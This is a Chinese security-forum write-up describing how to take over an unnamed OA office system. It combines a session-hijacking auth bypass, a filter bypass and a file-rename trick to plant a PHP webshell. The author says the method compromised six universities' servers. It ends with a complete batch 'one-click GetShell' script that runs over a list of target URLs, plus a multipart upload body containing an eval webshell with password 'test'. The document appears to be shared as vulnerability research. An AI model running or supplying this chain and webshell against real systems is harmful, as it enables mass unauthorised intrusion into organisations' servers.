说在前面
----

一天，在网上看到一篇文章，是关于某OA的在线用户类似越权访问登录漏洞的，突然来了兴致，便去找了找有关某OA系统，找了找顺带试了一下，这一试还真发现问题了，然后一不小心就进了人家的后台。来都来了，那总得get shell再走吧\\~  
以下附上本人get shell的全过程。本人只是个菜鸡，一起学习，勿喷\\~

介绍
--

根据我这么多天的挖掘，我发现某OA几乎都会存在一个类似于越权的漏洞，但是利用的方式确实比较特殊。  
登录后台后都可以通过菜单中的系统管理中的系统信息来查看其中的本地绝对路径；然后再进入附件管理中新建一个附件存储目录；都会有一个图片浏览设置、图片浏览和个人文件柜，不过所在的地方会根据不同网站进行改变，需要有一定的耐心去寻找。这几个都是最后get shell的关键步骤。

下面听我慢慢道来。

全过程
---

先找到其oa系统的路径https://x.x.x  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-34c5629eaf7fd96f24ea6ecbf773dd7c67b6d5d6.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-34c5629eaf7fd96f24ea6ecbf773dd7c67b6d5d6.png)  
在其路径后面加上“/mobile/auth\_mobi.php?isAvatar=1&amp;uid=1&amp;P\_VER=0 ”，然后访问其路径获取其phpsessid  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4540cfd9b0aa17dea579efe397ab048abf6e1494.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4540cfd9b0aa17dea579efe397ab048abf6e1494.png)  
可以看到我已经获取到了这个phpsessid。这个时候就可以访问后台页面了。  
但是如果页面显示的是RELOGIN，那么说明存在漏洞，但是管理员现在不在线，所以需要等他在线。就想这样，这时候虽然也有phpsessid，但是没什么用，还是无法登录进去  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8cd173174f1982ba7fc85756bdae4f05e29803ed.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8cd173174f1982ba7fc85756bdae4f05e29803ed.png)

访问https://x.x.x/general ，直接进入后台  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6e05a206baeb0c3a2b94a95cc66e9f225fb031ea.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6e05a206baeb0c3a2b94a95cc66e9f225fb031ea.png)

进入后台后，就要来查看下本地的绝对路径了，这步特别重要，因为这样后面传马才知道传到了哪里，才能用后门管理工具来进行连接

这里点击菜单-&gt;系统管理-&gt;系统信息  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1100ec1c918febcd83a372cfd67bb160419a26e6.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1100ec1c918febcd83a372cfd67bb160419a26e6.png)  
查看其中的本地绝对路径，这里是在D盘下的  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8cef3d87f63f04f43a18a5c126af7fa16d1e423c.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8cef3d87f63f04f43a18a5c126af7fa16d1e423c.png)  
然后再去菜单中点击附件管理  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-74782820696c0dfe2fe2969d6d75d78375e57e51.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-74782820696c0dfe2fe2969d6d75d78375e57e51.png)  
新建一个附件目录  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1bdf5a8bdb409e2f69be6fe3453e82f4b30930ee.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1bdf5a8bdb409e2f69be6fe3453e82f4b30930ee.png)  
这里我需要用大写Webroot来绕过，因为webroot会被过滤。注意这里是D盘下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-341d9e9b5ad9d61e801349569a56a24354d6bb7e.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-341d9e9b5ad9d61e801349569a56a24354d6bb7e.png)  
点击菜单中的知识管理中的图片浏览设置  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3110aed30e4fbc3f5583d172406e680c345d12e9.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3110aed30e4fbc3f5583d172406e680c345d12e9.png)  
然后添加图片目录。这里要注意的是需要将发布范围里添加一个系统管理员才可以。路径还是那个webroot路径。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-856c52ed1febb5386eef6a0feaf9c0739cef326f.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-856c52ed1febb5386eef6a0feaf9c0739cef326f.png)  
点击菜单中个人事务中的个人文件柜  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-a9f30dea062aba0e654ad1219602650ada245a74.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-a9f30dea062aba0e654ad1219602650ada245a74.png)  
然后添加一个文件，也就是我的shell。这里要注意要将木马改为jpg后缀，否则路径无法查看。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3cdffbf31e3c18d183d6e151d5d4b60c142e799a.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3cdffbf31e3c18d183d6e151d5d4b60c142e799a.png)  
点击知识管理中的图片浏览  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-72297e75c9b1a4353872d2197921802c6387ac52.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-72297e75c9b1a4353872d2197921802c6387ac52.png)  
查看木马路径。这个时候需要记住这个文件名称，这个路径是固定的  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-49601388b5a48eaaa1e9473028e05aa9dca21751.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-49601388b5a48eaaa1e9473028e05aa9dca21751.png)  
然后我们要把鼠标放到木马上面，点击重命名，然后就会打开一个新的tab页面。这时使用火狐进行抓包：先随便改个名字，点击保存，然后会拦截到一个post的封包。这个时候就需要修改`ATTACHMENT_NAME_POSTFIX`的属性为php.（这里后面有个`.`），然后重放这个数据包，可以看到已经修改成功  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5f4b030dc63a5f084412fe162754a8d6fcd5076c.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5f4b030dc63a5f084412fe162754a8d6fcd5076c.png)  
然后找到之前的那个文件名，将上传的原始的那个文件名`2.jpg`改为`166.php.`，这个是根据上传的路径以及我们改的名称来定的。最后就能访问到马了

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-9f45482ae073d04e9e15a04a69211a400c100ae8.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-9f45482ae073d04e9e15a04a69211a400c100ae8.png)  
这里第一个高校get shell到此结束，后续的高校get shell过程也大同小异，但是具体的细节略微有些不同，这里我再举一例，让大家来感受一下吧

前面的操作都一样，这里就直接贴图了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e43762d4e386e51d3a55c578009a69ce3460bc37.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e43762d4e386e51d3a55c578009a69ce3460bc37.png)

获取phpsession

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-9dafcff0855961aa3fa9f387b6a849dd4d1cc713.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-9dafcff0855961aa3fa9f387b6a849dd4d1cc713.png)

进入后台

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-14b06d9c88c374d48694b2df3a08c59e36708711.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-14b06d9c88c374d48694b2df3a08c59e36708711.png)  
还是要查看其中的本地绝对路径，这里不贴图了，是在E盘下面

然后点击附件管理

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-34582ca019141eb39eb15479e513b3bfa5ad9209.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-34582ca019141eb39eb15479e513b3bfa5ad9209.png)

新建一个附件目录

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-61709e6fb2114ca01d95d4d8c936de4cda1406cf.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-61709e6fb2114ca01d95d4d8c936de4cda1406cf.png)

这里用大写Webroot来绕过，注意这里是写成E盘下，这里就与上面的D盘不同了

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-897d65977c71b6cecde75d5235ebc11a2e32f63c.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-897d65977c71b6cecde75d5235ebc11a2e32f63c.png)

这里也有不同，是点击公共文件中的图片浏览设置

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c0d7d03244f20136ce52101ad1489773d3efc592.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c0d7d03244f20136ce52101ad1489773d3efc592.png)

添加图片目录。这里要注意的是需要将发布范围里添加一个系统管理员才可以。路径还是那个webroot路径。

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-904cc02049412ef8b5b5a936f38e9591a9aaace0.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-904cc02049412ef8b5b5a936f38e9591a9aaace0.png)

点击个人事务中的个人文件柜

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-294554b938368622474a22c035120ea18139529a.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-294554b938368622474a22c035120ea18139529a.png)

然后添加一个文件，也就是我的shell，这里要注意需要将木马改为jpg后缀，否则路径无法查看。

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d47160ad93e1d6c320c3c92cee14933deb7ac548.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d47160ad93e1d6c320c3c92cee14933deb7ac548.png)

点击公共文件中的图片浏览

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8ed6ea75ce9b0553851ab876732be1a64fa649f9.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8ed6ea75ce9b0553851ab876732be1a64fa649f9.png)

查看木马路径。这个时候记住这个文件名称，这个路径是固定的  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d706f18285c7fdff3bbe4fae512e3577166222d1.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d706f18285c7fdff3bbe4fae512e3577166222d1.png)  
然后我们要把鼠标放到木马上面，点击重命名，然后就会打开一个新的tab页面。这时使用火狐进行抓包：先随便改个名字，点击保存，然后会拦截到一个post的封包。这个时候就需要修改`ATTACHMENT_NAME_POSTFIX`的属性为php.（这里后面有个`.`），然后重放这个数据包，可以看到已经修改成功

然后找到之前的那个文件名，将上传的原始的那个文件名`2.jpg`改为`166.php.`，这个是根据上传的路径以及我们改的名称来定的。最后就能访问到马了

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6861ea74c24040d078469e16f0084faba704bd41.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6861ea74c24040d078469e16f0084faba704bd41.png)

这里大家应该能感受到其中的略微差别，自己注意下就行了。

按照这种操作，我get shell了6家高校，已经提交到漏洞平台了，正在审核\\~目前已经通过了几个，希望全部都能过吧，嘻嘻

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5fd645b181c5403e3088712b9b228780c7226e18.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5fd645b181c5403e3088712b9b228780c7226e18.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-193babaa0d7b7599cbf372a8a4f0df05d31a26b2.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-193babaa0d7b7599cbf372a8a4f0df05d31a26b2.png)

结尾
--

再附上脚本,是一位大师傅写的。  
**一键GetShell脚本**  
**脚本代码:**

```php
#define payload = /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
#define yinhao = "
#define Rootre = <td nowrap class="TableData">(.*?)</td>
#define contentidre = "TableLine1" index="(.*?)" >
#define attachmentidre = ATTACHMENT_ID_OLD" value="(.*?),"
#define shellpathre = alt="(.*?)" node-image-tips
function GetCookie(url){
    res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
    if(StrFindStr(res[1],"PHPSESSID",0) == "-1"){
        return "";
    }
    PHPSESSID = GettextMiddle(res[1],"PHPSESSID=",";");
    return PHPSESSID;
}
function JudgeOK(url,Cookie){
    res = HttpGet(url."/general/",Cookie);
    if(StrFindStr(res[0],"/static/js/ba/agent.js",0) == "-1"){
        return "0";
    }else{
        return "1";
    }

}
function GetRoot(content){
    list = StrRe(content,Rootre);
    num = GetArrayNum(list);
    num = num/2;
    i = 0;
    while(i<num){
        if(StrFindStr(list[ToInt(i*2+1)],":\",0) != "-1"){
            return list[ToInt(i*2+1)];
        }
        i = i+1;
    }
    return "";
}
function GetWebRoot(url,Cookie){
    res = HttpGet(url."/general/system/reg_view/",Cookie);
    return GetRoot(res[0]);
}
function AddPath(url,Root,Cookie){
    return HttpPost(url."/general/system/attachment/position/add.php","POS_ID=166&POS_NAME=166&POS_PATH=".URLEncode(Root."\WebRoot")."&IS_ACTIVE=on",Cookie);
}
function AddImgPath(url,Root,Cookie){
    return HttpPost(url."/general/system/picture/new/submit.php","TO_ID=&TO_NAME=&PRIV_ID=&PRIV_NAME=©_TO_ID=admin%2C©_TO_NAME=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1%2C&PIC_NAME=test&PIC_PATH=".URLEncode(Root."\webRoot")."&ROW_PIC=5&ROW_PIC_NUM=7",Cookie);
}
function PushImg(url,Content,Cookie){
    return HttpPost(url."/general/file_folder/new/submit.php",Content,Cookie.StrRN()."Content-Type: multipart/form-data; boundary=---------------------------33072116513621237124579432636");
}
function GetPICID(url,Cookie){
    res = HttpGet(url."/general/picture/tree.php?CUR_DIR=&PIC_ID=&_=1615284234507",Cookie);
    return GettextMiddle(res[0],"&PIC_ID=",yinhao);
}
function GetImg(url,Root,Cookie){
    res = HttpGet(url."/general/picture/picture_view.php?SUB_DIR=2103&PIC_ID=".GetPICID(url,Cookie)."&CUR_DIR=".URLEncode(StrReplace(Root,"\\","/"))."%2Fwebroot%2Ffile_folder%2F2103",Cookie);
    list = StrRe(res[0],shellpathre);
    num = GetArrayNum(list);
    num = num/2;
    i = 0;
    while(i<num){
        if(StrFindStr(list[ToInt(i*2+1)],"1.jpg",0) != "-1"){
            return list[ToInt(i*2+1)];
        }
        i = i+1;
    }
    return "";
}
function ChangeImgName(url,CONTENT,ATTACHMENT,Cookie){
    return HttpPost(url."/general/file_folder/rename_submit.php","NEW_FILE_NAME=166&CONTENT_ID=".CONTENT."&FILE_SORT=2&ATTACHMENT_ID=".URLEncode(ATTACHMENT)."&ATTACHMENT_NAME_POSTFIX=php.&ATTACHMENT_NAME=1.jpg&FIRST_ATTACHMENT_NAME=1&FILE_NAME_OLD=1.jpg",Cookie);
}
function GetCONTENTID(url,Cookie){
    res = HttpGet(url."/general/file_folder/folder.php?FILE_SORT=2&SORT_ID=0",Cookie);
    list = StrRe(res[0],contentidre);
    if(GetArrayNum(list) >= 2){
        return list[1];
    }
    return "";
}
function GetATTACHMENTID(url,CONTENTID,Cookie){
    res = HttpGet(url."/general/file_folder/edit.php?FILE_SORT=2&SORT_ID=0&CONTENT_ID=".CONTENTID."&start=0",Cookie.StrRN()."Referer: ".url."/general/file_folder/folder.php?FILE_SORT=2&SORT_ID=0");
    list = StrRe(res[0],attachmentidre);
    if(GetArrayNum(list) >= 2){
        return list[1];
    }
    return "";
}
function GetShell(url){
    PHPSESSID = GetCookie(url);
    if(PHPSESSID == ""){
        return "";
    }
    Cookie = "Cookie: PHPSESSID=".PHPSESSID.";".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0";
    if(JudgeOK(url,Cookie)=="1"){
        WebRoot = GetWebRoot(url,Cookie);
        AddPath(url,WebRoot,Cookie);
        AddImgPath(url,WebRoot,Cookie);
        ShellPost = ReadFile("s cript\综合漏洞\OAShell.txt");
        PushImg(url,ShellPost,Cookie);
        path = GetImg(url,WebRoot,Cookie);
        CONTENTID = GetCONTENTID(url,Cookie);
        ATTACHMENTID=GetATTACHMENTID(url,CONTENTID,Cookie);
        ChangeImgName(url,CONTENTID,ATTACHMENTID,Cookie);
        realshellpath = url."/file_folder/2103/".StrReplace(path,"1.jpg","166.php");
        print("Shell路径:",realshellpath,"密码:test");
    }else{
        return "";
    }
}
function main(args){
    print("请输入要要检测的列表文件:"); 
    list = StrSplit(ReadFile(input()),StrRN());
    i = 0;
    num = GetArrayNum(list);
    while(i < num){
        url=list[ToInt(i)];
        print("当前检测的连接:".url);
        GetShell(url);
        i=i+1;
    }
    print("检测完毕");
}
```

**OAShell.txt：**

```php
-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="SUBJECT"

166.jpg
-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="CONTENT_NO"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="TD_HTML_EDITOR_CONTENT"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="KEYWORD"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="NEW_NAME"

ÐÂ½¨ÎÄµµ
-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="NEW_TYPE"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACHMENT_1"; filename=""
Content-Type: application/octet-stream

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACH_NAME"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACH_DIR"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="DISK_ID"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACHMENT_1000"; filename=""
Content-Type: application/octet-stream

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACHMENT_DESC"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="CONTENT_ID"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="OP"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="PD"

1
-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="SORT_ID"

0
-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACHMENT_ID_OLD"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACHMENT_NAME_OLD"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="FILE_SORT"

2
-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="USE_CAPACITY"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="USE_CAPACITY_SIZE"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="SHARE_USER"

-----------------------------33072116513621237124579432636
Content-Disposition: form-data; name="ATTACHMENT_0"; filename="1.jpg"
Content-Type: image/jpeg

<?php @e val($_POST['test']); ?>
-----------------------------33072116513621237124579432636--
```